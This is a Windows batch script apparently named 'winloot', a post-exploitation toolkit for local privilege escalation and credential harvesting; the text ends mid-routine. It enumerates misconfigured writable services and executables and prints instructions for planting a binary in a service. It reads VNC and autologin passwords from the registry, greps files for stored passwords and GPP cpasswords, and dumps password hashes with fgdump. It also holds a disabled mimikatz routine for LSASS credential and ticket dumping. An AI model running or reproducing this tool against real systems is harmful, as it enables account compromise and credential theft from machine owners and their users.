@echo off

::#############################################################################

SetLocal EnableExtensions EnableDelayedExpansion

::#############################################################################

:begin
call :setenv
if not exist %RESULTDIR% (
    mkdir %RESULTDIR%
)
call :print_header
call :main_menu
call :unsetenv

goto end

::#############################################################################

:setenv
call :repeatchar SLONGLINE # 78
set MY_NAME=%~n0
set MY_VERSION=v0.01
if defined ProgramFiles(x86) (
    set OSBIT=64
) else (
    set OSBIT=32
)

if defined USERNAME (
    :: Ignore trailing "$" in the username
    if "!USERNAME:~-1!"=="$" (
        set WHOAMI=!USERNAME:~0,-1!
    ) else (
        set WHOAMI=%USERNAME%
    )
) else (
    for /f "tokens=2 delims=\" %%a in ('whoami') do set WHOAMI=%%a
)
:: Replace spaces with underscore
set WHOAMI=%WHOAMI: =_%
if not defined WHOAMI (
    echo Error: could not determine the user name^^!
    goto end
)
net session >nul 2>&1
if %errorLevel% == 0 (
    set RUNNINGASADMIN=1
    set RESULTDIR=.\winloot_%WHOAMI%_admin
) else (
    set RESULTDIR=.\winloot_%WHOAMI%
)
set ALLFILES=%RESULTDIR%\dirlisting_%WHOAMI%.txt
goto :EOF

::#############################################################################

:unsetenv
set SLONGLINE=
set MY_NAME=
set MY_VERSION=
set OSBIT=
set WHOAMI=
set RUNNINGASADMIN=
set RESULTDIR=
set ALLFILES=
set RETSTR=
set REPEATCHAR=
set REPEATIMES=
set CHOICE=
goto :EOF

::#############################################################################

:main_menu
echo.
set CHOICE=x
echo  [q] Check ^"quick wins^"
echo  [u] Check user information
echo  [s] Check system information
echo  [n] Check network information
echo  [t] Check running services, tasks, drivers
echo  [w] Check writable service executables
echo  [c] Check writable files and folders
echo  [v] Check writable services
::echo  [j] Dump hashes using mimikatz
echo  [r] Dump registry
echo  [d] Dump dirlisting
echo  [f] Find interesting files
echo  [k] Find interesting registry keys
echo  [p] Find files that might contain passwords etc.
echo  [z] Zip the result folder
echo  [a] Run all above
echo  [h] Dump hashes using fgdump
echo  [m] Make winloot.zip
echo  [x] Exit
echo.

set /p CHOICE=Select [%CHOICE%]:
if not '%CHOICE%'=='' set CHOICE=%CHOICE:~0,1%

if '%CHOICE%'=='q' goto do_check_quickwins
if '%CHOICE%'=='u' goto do_check_userinfo
if '%CHOICE%'=='s' goto do_check_systeminfo
if '%CHOICE%'=='n' goto do_check_networkinfo
if '%CHOICE%'=='t' goto do_check_running
if '%CHOICE%'=='w' goto do_check_writable_serviceexes
if '%CHOICE%'=='c' goto do_check_writable_files_and_folders
if '%CHOICE%'=='v' goto do_check_writable_services
::if '%CHOICE%'=='j' goto do_hashes_mimikatz
if '%CHOICE%'=='r' goto do_dump_registry
if '%CHOICE%'=='d' goto do_dump_dirlisting
if '%CHOICE%'=='f' goto do_find_interestingfiles
if '%CHOICE%'=='k' goto do_find_interestingregkeys
if '%CHOICE%'=='p' goto do_find_passwords
if '%CHOICE%'=='z' goto do_zip_results
if '%CHOICE%'=='a' goto do_all
if '%CHOICE%'=='h' goto do_hashes_fgdump
if '%CHOICE%'=='m' goto do_make_winlootzip
if '%CHOICE%'=='x' goto :EOF
echo Unknown option "%CHOICE%" - try again
goto main_menu
goto :EOF

::#############################################################################

:do_all
call :do_check_quickwins
call :do_check_userinfo
call :do_check_systeminfo
call :do_check_networkinfo
call :do_check_running
call :do_check_writable_serviceexes
call :do_check_writable_files_and_folders
call :do_check_writable_services
call :do_dump_registry
call :do_dump_dirlisting
::call :do_hashes_mimikatz
call :do_find_interestingfiles
call :do_find_interestingregkeys
call :do_find_passwords
call :do_zip_results
goto end

::#############################################################################

:do_make_winlootzip
set ZIP=winloot.zip
::set FILES=cyggcc_s-1.dll cygiconv-2.dll cygintl-8.dll cygpcre-1.dll cygwin1.dll accesschk.exe grep.exe mimikatz32.exe mimikatz64.exe nc.exe nc_receivefile.bat nc_receivefile_client.bat nc_sendfile.bat nc_sendfile_server.bat pv.exe tee.exe unzip.exe winloot.bat xargs.exe zip.exe tasklist_xp32.exe systeminfo_xp32.exe schtasks_xp32.exe driverquery_xp32.exe wget_powershell.bat whoami.exe handle.exe handle_check.bat fgdump.exe nc_rshell_runas.bat
set FILES=cyggcc_s-1.dll cygiconv-2.dll cygintl-8.dll cygpcre-1.dll cygwin1.dll accesschk.exe grep.exe nc.exe nc_receivefile.bat nc_receivefile_client.bat nc_sendfile.bat nc_sendfile_server.bat pv.exe tee.exe unzip.exe winloot.bat xargs.exe zip.exe tasklist_xp32.exe systeminfo_xp32.exe schtasks_xp32.exe driverquery_xp32.exe wget_powershell.bat whoami.exe handle.exe handle_check.bat fgdump.exe nc_rshell_runas.bat

zip -9 -S -r %ZIP% %FILES% 2>nul

echo [+] Wrote zip file: %ZIP%
echo.
goto end

::#############################################################################

:do_zip_results
set ZIP=%RESULTDIR%.zip
echo [+] Generating zip file from results: %RESULTDIR%

zip -9 -S -r %ZIP% %RESULTDIR% 2>nul

echo [+] Wrote zip file: %ZIP%
echo.
goto end

::#############################################################################

:do_find_passwords
set OUT=%RESULTDIR%\passwords_%WHOAMI%.txt
echo %SLONGLINE%>%OUT%
echo [+] Finding files that might contain passwords etc. | tee -a %OUT%
echo %SLONGLINE%>>%OUT%

set NAMEPATTERN=".*\.ini$|.*\.inf$|.*\.conf$|.*\.txt$"
set CONTENTPATTERN="password[ ^I]*=|pwd[ ^I]*=|pass[ ^I]*="
echo [+] Checking %NAMEPATTERN% files...
call :grepfiles %NAMEPATTERN% %CONTENTPATTERN% %OUT%

set NAMEPATTERN=".*\.xml$"
set CONTENTPATTERN="<.*password>|<.*pwd>|<.*passw>|password[ ^I]*=|pwd[ ^I]*=|pass[ ^I]*="
echo [+] Checking %NAMEPATTERN% files...
call :grepfiles %NAMEPATTERN% %CONTENTPATTERN% %OUT%

set NAMEPATTERN=".*\.bat$|.*\.cmd$"
set CONTENTPATTERN="net.*use.*user"
echo [+] Checking %NAMEPATTERN% files...
call :grepfiles %NAMEPATTERN% %CONTENTPATTERN% %OUT%

set CONTENTPATTERN=
set NAMEPATTERN=

echo [+] Wrote output to: %OUT%
echo.
goto end

::#############################################################################

:do_check_writable_serviceexes
set OUT=%RESULTDIR%\writable_serviceexes_%WHOAMI%.txt
echo %SLONGLINE%>%OUT%
echo [+] Checking writable service executables | tee -a %OUT%
echo %SLONGLINE%>>%OUT%

:: fuzzysecurity dot com / tutorials / 16 dot html

call :generate_allfileslist

:: Do we have tasklist in the path? If not, use the tasklist_xp32.exe binary
:: delivered with winloot
set FOUND=
set TASKLIST=tasklist.exe
for %%X in (%TASKLIST%) do (set FOUND=%%~$PATH:X)
if not defined FOUND (
	echo [+] Warning: %TASKLIST% not found, using tasklist_xp32.exe
	set TASKLIST=tasklist_xp32.exe
)
set FOUND=

set SERVICE_EXES=%RESULTDIR%\serviceexes_%WHOAMI%.txt
if exist %SERVICE_EXES% (
    echo [+] Note: using existing servicexes: %SERVICE_EXES%
    goto skip_serviceexes
)
for /f "tokens=1 delims=," %%a in ('%TASKLIST% /SVC /FO CSV ^| findstr /I \.*exe*. ^| findstr /VI "smss.exe csrss.exe winlogon.exe services.exe spoolsv.exe explorer.exe ctfmon.exe wmiprvse.exe msmsgs.exe notepad.exe lsass.exe svchost.exe findstr.exe cmd.exe %TASKLIST%"') do (findstr %%a$ | findstr /VI "\.*winsxs\\*.") <%ALLFILES%>>%SERVICE_EXES%
:skip_serviceexes
echo [+] Checking services...
for /f "tokens=*" %%a in (%SERVICE_EXES%) do (cacls "%%a"|findstr /I "Users:"|findstr /I "W F">nul) && (
    echo [+] VULNERABLE: Write access to service executable: %%a>>%OUT%) || (call)
for /f "tokens=*" %%a in (%SERVICE_EXES%) do (cacls "%%a"|findstr /I "Everyone"|findstr /I "W F">nul) && (
    echo [+] VULNERABLE: Write access to service executable: %%a>>%OUT%) || (call)

set TASKLIST=
set SERVICE_EXES=
	
echo [+] Wrote output to: %OUT%
echo.
goto end

::#############################################################################

:do_check_writable_files_and_folders
set OUT=%RESULTDIR%\writable_files_folders_%WHOAMI%.txt
echo %SLONGLINE%>%OUT%
echo [+] Checking writable files and folders | tee -a %OUT%
echo %SLONGLINE%>>%OUT%

if not exist accesschk.exe (
    echo [+] Error: accesschk.exe not found | tee -a %OUT%
    goto end
)

accesschk.exe /accepteula > nul 2>&1
accesschk.exe -uwqs "Everyone" c:\*.* | findstr /VI "\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*.">>%OUT%
accesschk.exe -uwqs "Users" c:\*.* | findstr /VI "\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*.">>%OUT%
accesschk.exe -uwqs "Authenticated Users" c:\*.*  | findstr /VI \.*System.Volume.Information*. | findstr /VI \.*Documents.And.Settings*.>>%OUT%

echo [+] Wrote output to: %OUT%
echo.
goto end

::#############################################################################

:do_check_writable_services
set OUT=%RESULTDIR%\writable_services_%WHOAMI%.txt
echo %SLONGLINE%>%OUT%
echo [+] Checking writable services | tee -a %OUT%
echo %SLONGLINE%>>%OUT%

if not exist accesschk.exe (
    echo [+] Error: accesschk.exe not found | tee -a %OUT%
    goto end
)

accesschk.exe /accepteula > nul 2>&1
accesschk.exe -uwcqv "Authenticated Users" * | Find "RW " > nul
if %errorlevel% == 0 (
    echo.>>%OUT%
    echo [+] VULNERABLE SERVICES FOUND - Authenticated Users>>%OUT%
    accesschk.exe -uwcqv "Authenticated Users" *>>%OUT%
)
accesschk.exe /accepteula > nul 2>&1
accesschk.exe -uwcqv "Users" * | Find "RW " > nul
if %errorlevel% == 0 (
    echo.>>%OUT%
    echo [+] VULNERABLE SERVICES FOUND  - All Users>>%OUT%
    accesschk.exe -uwcqv "Users" *>>%OUT%
    echo.*******************************************************>>%OUT%
    echo.To plant binary in service use:>>%OUT%
    echo.sc config [service_name] binpath= "[binary.exe]">>%OUT%
    echo.sc config [service_name] obj= ".\LocalSystem" password= "">>%OUT%
    echo.sc qc [service_name] to verify>>%OUT%
    echo.net start [service_name]>>%OUT%
    echo.*******************************************************>>%OUT%
)
accesschk.exe /accepteula > nul 2>&1
accesschk.exe -uwcqv "Everyone" * | Find "RW " > nul
if %errorlevel% == 0 (
    echo.>>%OUT%
    echo [+] VULNERABLE SERVICES FOUND - Everyone>>%OUT%
    accesschk.exe -uwcqv "Everyone" *>>%OUT%
    echo.*******************************************************>>%OUT%
    echo.To plant binary in service use:>>%OUT%
    echo.sc config [service_name] binpath= "[binary.exe]">>%OUT%
    echo.sc config [service_name] obj= ".\LocalSystem" password= "">>%OUT%
    echo.sc qc [service_name] to verify>>%OUT%
    echo.net start [service_name]>>%OUT%
    echo.*******************************************************>>%OUT%
)

echo [+] Wrote output to: %OUT%
echo.
goto end

::#############################################################################

:do_hashes_fgdump
set OUT=%RESULTDIR%\hashes_passwords_%WHOAMI%.txt
echo %SLONGLINE%>%OUT%
echo [+] Trying to read passwords and hashes
echo %SLONGLINE%>>%OUT%

if not defined RUNNINGASADMIN (
    echo [+] Warning: Not an admin, this check might be inaccurate
)

set CMD=fgdump.exe
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] pwdump: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%
copy /y /b *log+*pwdump %OUT%

echo [+] Wrote output to: %OUT%
echo.
goto end

::#############################################################################

:do_hashes_mimikatz
set OUT=%RESULTDIR%\mimikatz_%WHOAMI%.txt
echo %SLONGLINE%>%OUT%
echo [+] Running mimikatz | tee -a %OUT%
echo %SLONGLINE%>>%OUT%

set katz=mimikatz%OSBIT%.exe
if not exist %katz% (
    echo [+] Error: %katz% not found, skipping mimikatz checks | tee -a %OUT%
    goto end
)
if not defined RUNNINGASADMIN (
    echo [+] Warning: Not an admin, this check might be inaccurate | tee -a %OUT%
)

set CMD=%katz% "privilege::debug" "sekurlsa::logonPasswords full" "exit"
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] sekurlsa::logonPasswords: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set CMD=%katz% "privilege::debug" "token::elevate" "lsadump::sam" "exit"
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] lsadump::sam: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set CMD=%katz% "privilege::debug" "token::elevate" "sekurlsa::tickets /export" "exit"
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] sekurlsa::tickets: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set CMD=%katz% "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_CURRENT_USER /store:my /export" "exit"
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] crypto::certificates (CERT_SYSTEM_STORE_LOCAL_MACHINE): ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set CMD=%katz% "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE /store:my /export" "exit"
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] crypto::certificates (CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE): ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set CMD=%katz% "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_USERS /store:my /export" "exit"
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] crypto::certificates (CERT_SYSTEM_STORE_USERS): ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

echo [+] Wrote output to: %OUT%
echo.
goto end

::#############################################################################

:do_dump_registry
set OUT=%RESULTDIR%\registrydump_%WHOAMI%.txt
echo [+] Dumping registry...

if exist %OUT% (
    echo [+] Note: using existing registrydump: %OUT%
) else (
    reg export HKLM hklm.txt 2>nul
    reg export HKCU hkcu.txt 2>nul
    copy /y /b hkcu.txt+hklm.txt %OUT%
    echo [+] Wrote: %OUT%
)

echo [+] Done
echo.
goto end

::#############################################################################

:do_dump_dirlisting

call :generate_allfileslist

echo [+] Done
echo.
goto end

::#############################################################################

:do_check_userinfo
set OUT=%RESULTDIR%\userinfo_%WHOAMI%.txt
echo %SLONGLINE%>%OUT%
echo [+] Enumerating user and environmental info | tee -a %OUT%
echo %SLONGLINE%>>%OUT%

echo [+] Username: %WHOAMI%>>%OUT%

if defined RUNNINGASADMIN (
    echo [+] VULNERABLE: Administrative permissions detected^^!>>%OUT%
) else (
    echo [+] Not running as an admin>>%OUT%
)

set CMD=net user %WHOAMI%
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] User details: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set CMD=net users
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] User accounts: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set CMD=set
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] Environment variables: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
:: Unset the script's variables so they don't appear among the print-out
call :unsetenv
%CMD%>>%OUT%
:: Re-set the script's environment
call :setenv

gpresult /R > nul 2>&1
if %errorlevel% == 1 (
    set CMD=gpresult
) else ( 
    set CMD=gpresult /R
)
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] Group Policy: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%
set CMD=

echo [+] Wrote output to: %OUT%
echo.
goto end

::#############################################################################

:do_check_networkinfo
set OUT=%RESULTDIR%\networkinfo_%WHOAMI%.txt
echo %SLONGLINE%>%OUT%
echo [+] Getting networking info | tee -a %OUT%
echo %SLONGLINE%>>%OUT%

set CMD=ipconfig /all
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] Ipconfig: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set CMD=netstat -ano
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] Netstat: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set CMD=arp -a
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] ARP table: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set CMD=route print
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] Routing table: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

for /f "tokens=1 delims=" %%a in ('netsh /? ^| findstr \.*.irewal.*.*') do (
    set NETSHFIREWALL=1
)
if defined NETSHFIREWALL (
    set CMD=netsh firewall show state
    echo.>>%OUT%
    echo %SLONGLINE%>>%OUT%
    echo [+] Firewall status: ^"!CMD!^">>%OUT%
    echo %SLONGLINE%>>%OUT%
    !CMD!>>%OUT%

    set CMD=netsh firewall show config
    echo.>>%OUT%
    echo %SLONGLINE%>>%OUT%
    echo [+] Firewall config: ^"!CMD!^">>%OUT%
    echo %SLONGLINE%>>%OUT%
    !CMD!>>%OUT%
)
set NETSHFIREWALL=

echo [+] Wrote output to: %OUT%
echo.
goto end

::#############################################################################

:do_check_systeminfo
set OUT=%RESULTDIR%\systeminfo_%WHOAMI%.txt
echo %SLONGLINE%>%OUT%
echo [+] Getting basic system info | tee -a %OUT%
echo %SLONGLINE%>>%OUT%

echo [+] 32/64-bit: %OSBIT%>>%OUT%

:: Do we have systeminfo in the path? If not, use the systeminfo_xp32.exe
:: binary delivered with winloot
set FOUND=
set SYSTEMINFO=systeminfo.exe
for %%X in (%SYSTEMINFO%) do (set FOUND=%%~$PATH:X)
if not defined FOUND (
	echo [+] Warning: %SYSTEMINFO% not found, using systeminfo.exe
	set SYSTEMINFO=systeminfo_xp32.exe
)
set FOUND=

set CMD=%SYSTEMINFO%
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] Systeminfo: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set SYSTEMINFO=
set CMD=

echo [+] Wrote output to: %OUT%
echo.
goto end

::#############################################################################

:do_check_running
set OUT=%RESULTDIR%\running_%WHOAMI%.txt
echo %SLONGLINE%>%OUT%
echo [+] Checking what is running: processes, services, tasks, drivers | tee -a %OUT%
echo %SLONGLINE%>>%OUT%

:: Do we have tasklist in the path? If not, use the tasklist_xp32.exe binary
:: delivered with winloot
set FOUND=
set TASKLIST=tasklist.exe
for %%X in (%TASKLIST%) do (set FOUND=%%~$PATH:X)
if not defined FOUND (
	echo [+] Warning: %TASKLIST% not found, using tasklist_xp32.exe
	set TASKLIST=tasklist_xp32.exe
)
set FOUND=
:: Same check for schtasks
set SCHTASKS=schtasks.exe
for %%X in (%SCHTASKS%) do (set FOUND=%%~$PATH:X)
if not defined FOUND (
	echo [+] Warning: %SCHTASKS% not found, using schtasks_xp32.exe
	set SCHTASKS=schtasks_xp32.exe
)
set FOUND=
:: and driverquery
set DRIVERQUERY=driverquery.exe
for %%X in (%DRIVERQUERY%) do (set FOUND=%%~$PATH:X)
if not defined FOUND (
	echo [+] Warning: %DRIVERQUERY% not found, using driverquery_xp32.exe
	set DRIVERQUERY=driverquery_xp32.exe
)
set FOUND=

set CMD=%TASKLIST%
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] Tasklist: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set CMD=net start
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] Running services (tidy): ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set CMD=sc queryex type= service
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] Running services (details): ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set CMD=%TASKLIST% /SVC
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] Task to service mapping: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set CMD=%SCHTASKS% /query /fo LIST /v
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] Scheduled tasks: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set CMD=%DRIVERQUERY%
echo.>>%OUT%
echo %SLONGLINE%>>%OUT%
echo [+] List of installed drivers: ^"%CMD%^">>%OUT%
echo %SLONGLINE%>>%OUT%
%CMD%>>%OUT%

set TASKLIST=
set SCHTASKS=
set DRIVERQUERY=

echo [+] Wrote output to: %OUT%
echo.
goto end

::#############################################################################

:do_check_quickwins
set OUT=%RESULTDIR%\quickwins_%WHOAMI%.txt
echo %SLONGLINE%>%OUT%
echo [+] Checking ^"quick wins^" | tee -a %OUT%
echo %SLONGLINE%>>%OUT%

:: Mass rollout files
set NAMEPATTERN=".*sysprep\.inf$|.*sysprep\.xml$|.*sysprep\.ini$"
set CONTENTPATTERN="passw|pass|pwd|administrator"
echo [+] Mass rollout files: checking %NAMEPATTERN%
call :grepfiles %NAMEPATTERN% %CONTENTPATTERN% %OUT%

:: Group policy files
set NAMEPATTERN=".*groups\.xml$|services\.xml$|scheduledtasks\.xml$|printers\.xml$|drivers\.xml$|datasources\.xml$"
set CONTENTPATTERN="cpassword"
echo [+] Group policy files: checking %NAMEPATTERN%
call :grepfiles %NAMEPATTERN% %CONTENTPATTERN% %OUT%

:: AlwaysInstallElevated
set KEY=HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
set VAL=AlwaysInstallElevated
reg query "%KEY%" /v "%VAL%" 2>nul | find "0x1" > nul
if %ERRORLEVEL% == 0 (set ALWAYSINSTALLELEVATED_HKLM=1)

set KEY=HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
set VAL=AlwaysInstallElevated
reg query "%KEY%" /v "%VAL%" 2>nul | find "0x1" > nul
if %ERRORLEVEL% == 0 (set ALWAYSINSTALLELEVATED_HKCU=1)

if defined ALWAYSINSTALLELEVATED_HKLM if defined ALWAYSINSTALLELEVATED_HKCU (
    echo [+] VULNERABLE: AlwaysInstallElevated>>%OUT%
)

:: Realvnc Password
set KEY=HKLM\SOFTWARE\RealVNC\vncserver
set VAL=Password
reg query "%KEY%" /v "%VAL%" > nul 2>&1
if %ERRORLEVEL% == 0 (
    echo [+] VULNERABLE: RealVNC password:>>%OUT%
    reg query "%KEY%" /v "%VAL%">>%OUT%
)

:: Realvnc Password
set KEY=HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4
set VAL=Password
reg query "%KEY%" /v "%VAL%" > nul 2>&1
if %ERRORLEVEL% == 0 (
    echo [+] VULNERABLE: RealVNC password:>>%OUT%
    reg query "%KEY%" /v "%VAL%">>%OUT%
)

:: TightVNC Password
set KEY=HKLM\Software\TightVNC\Server
set VAL=Password
reg query "%KEY%" /v "%VAL%" > nul 2>&1
if %ERRORLEVEL% == 0 (
    echo [+] VULNERABLE: TightVNC password:>>%OUT%
    reg query "%KEY%" /v "%VAL%">>%OUT%
)

:: TightVNC PasswordViewOnly
set KEY=HKLM\Software\TightVNC\Server
set VAL=PasswordViewOnly
reg query "%KEY%" /v "%VAL%" > nul 2>&1
if %ERRORLEVEL% == 0 (
    echo [+] VULNERABLE: TightVNC PasswordViewOnly:>>%OUT%
    reg query "%KEY%" /v "%VAL%">>%OUT%
)

:: TigerVNC Password
set KEY=HKLM\Software\TightVNC\Server
set VAL=Password
reg query "%KEY%" /v "%VAL%" > nul 2>&1
if %ERRORLEVEL% == 0 (
    echo [+] VULNERABLE: TigerVNC Password:>>%OUT%
    reg query "%KEY%" /v "%VAL%">>%OUT%
)

:: WinVNC3 Password
set KEY=HKLM\SOFTWARE\ORL\WinVNC3\Default
set VAL=Password
reg query "%KEY%" /v "%VAL%" > nul 2>&1
if %ERRORLEVEL% == 0 (
    echo [+] VULNERABLE: WinVNC3 Password:>>%OUT%
    reg query "%KEY%" /v "%VAL%">>%OUT%
)

:: WinVNC3 Password
set KEY=HKLM\SOFTWARE\ORL\WinVNC3
set VAL=Password
reg query "%KEY%" /v "%VAL%" > nul 2>&1
if %ERRORLEVEL% == 0 (
    echo [+] VULNERABLE: WinVNC3 Password:>>%OUT%
    reg query "%KEY%" /v "%VAL%">>%OUT%
)

:: WinVNC3 Password
set KEY=HKCU\Software\ORL\WinVNC3
set VAL=Password
reg query "%KEY%" /v "%VAL%" > nul 2>&1
if %ERRORLEVEL% == 0 (
    echo [+] VULNERABLE: WinVNC3 Password:>>%OUT%
    reg query "%KEY%" /v "%VAL%">>%OUT%
)

:: Windows autologin
set KEY=HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
set VAL=DefaultPassword
reg query "%KEY%" /v "%VAL%" > nul 2>&1
if %ERRORLEVEL% == 0 (
    echo [+] VULNERABLE: Windows autologin Password:>>%OUT%
    reg query "%KEY%" /v "%VAL%">>%OUT%
    
    set KEY=HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    set VAL=DefaultUsername
    reg query "%KEY%" /v "%VAL%" > nul 2>&1
    if %ERRORLEVEL% == 0 (
        reg query "%KEY%" /v "%VAL%">>%OUT%
    )
    
    set KEY=HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    set VAL=DefaultDomainname
    reg query "%KEY%" /v "%VAL%" > nul 2>&1
    if %ERRORLEVEL% == 0 (
        reg query "%KEY%" /v "%VAL%">>%OUT%
    )
)
set NAMEPATTERN=
set CONTENTPATTERN=
set VAL=
set KEY=

echo [+] Wrote output to: %OUT%
echo.
goto end

::#############################################################################

:do_find_interestingfiles
set OUT=%RESULTDIR%\findfiles_%WHOAMI%.txt
echo %SLONGLINE%>%OUT%
echo [+] Finding interesting files and directories | tee -a %OUT%
echo %SLONGLINE%>>%OUT%

call :generate_allfileslist

echo [+] Searching...
echo [+] memory.dmp:>>%OUT%
findstr /I \.*memory[.]dmp$ %ALLFILES%>>%OUT%
echo [+] hdmp:>>%OUT%
findstr /I \.*[.]hdmp$ %ALLFILES%>>%OUT%
echo [+] mdmp:>>%OUT%
findstr /I \.*[.]mdmp$ %ALLFILES%>>%OUT%
echo [+] all dumps:>>%OUT%
findstr /I \.*[.]dmp$ %ALLFILES%>>%OUT%
echo [+] tmp files:>>%OUT%
findstr /I \.*[.]tmp$ %ALLFILES%>>%OUT%
echo [+] cab:>>%OUT%
findstr /I \.*report.*[.]cab$ %ALLFILES%>>%OUT%
echo [+] sqs:>>%OUT%
findstr /I \.*report.*[.]sqs$ %ALLFILES%>>%OUT%
echo [+] pcap:>>%OUT%
findstr /I \.*[.]pcap$ %ALLFILES%>>%OUT%
echo [+] ultravnc.ini:>>%OUT%
findstr /I \.*ultravnc[.]ini$ %ALLFILES%>>%OUT%
echo [+] vnc.ini:>>%OUT%
findstr /I \.*vnc[.]ini$ %ALLFILES%>>%OUT%
echo [+] bthpan:>>%OUT%
findstr /I \.*bthpan[.]sys$ %ALLFILES%>>%OUT%
echo [+] repair:>>%OUT%
findstr /I \.*\\repair$ %ALLFILES%>>%OUT%
echo [+] vnc:>>%OUT%
findstr /I \.*[.]vnc$ %ALLFILES%>>%OUT%
echo [+] groups:>>%OUT%
findstr /I \.*groups[.]xml$ %ALLFILES%>>%OUT%
echo [+] printers:>>%OUT%
findstr /I \.*printers[.]xml$ %ALLFILES%>>%OUT%
echo [+] drives:>>%OUT%
findstr /I \.*drives[.]xml$ %ALLFILES%>>%OUT%
echo [+] scheduledtasks:>>%OUT%
findstr /I \.*scheduledtasks[.]xml$ %ALLFILES%>>%OUT%
echo [+] services:>>%OUT%
findstr /I \.*services[.]xml$ %ALLFILES%>>%OUT%
echo [+] datasources:>>%OUT%
findstr /I \.*datasources[.]xml$ %ALLFILES%>>%OUT%
echo [+] rsa:>>%OUT%
findstr /I \.*.rsa.*[.].*$  %ALLFILES% | findstr /VI \.*.dll$ | findstr /VI \.*.rat$>>%OUT%
echo [+] dsa:>>%OUT%
findstr /I \.*.dsa.*[.].*$  %ALLFILES% | findstr /VI \.*.dll$ | findstr /VI \.*.exe$ | findstr /VI \.*.gif$ | findstr /VI \.*.handsafe[.]reg$>>%OUT%
echo [+] dbx:>>%OUT%
findstr /I \.*[.]dbx$ %ALLFILES%>>%OUT%
echo [+] account:>>%OUT%
findstr /I \.*.account.*.$  %ALLFILES% | findstr /VI \.*.User.Account.Picture.*. | findstr /VI \.*.bmp$>>%OUT%
echo [+] ntds:>>%OUT%
findstr /I \.*ntds[.].*$ %ALLFILES%>>%OUT%
echo [+] hiberfil:>>%OUT%
findstr /I \.*hiberfil[.].*$ %ALLFILES%>>%OUT%
echo [+] boot.ini:>>%OUT%
findstr /I \.*boot[.]ini$ %ALLFILES%>>%OUT%
echo [+] win.ini:>>%OUT%
findstr /I \.*win[.]ini$ %ALLFILES%>>%OUT%
echo [+] RegBack:>>%OUT%
findstr /I \.*.\\config\\RegBack %ALLFILES%>>%OUT%
echo [+] CCM:>>%OUT%
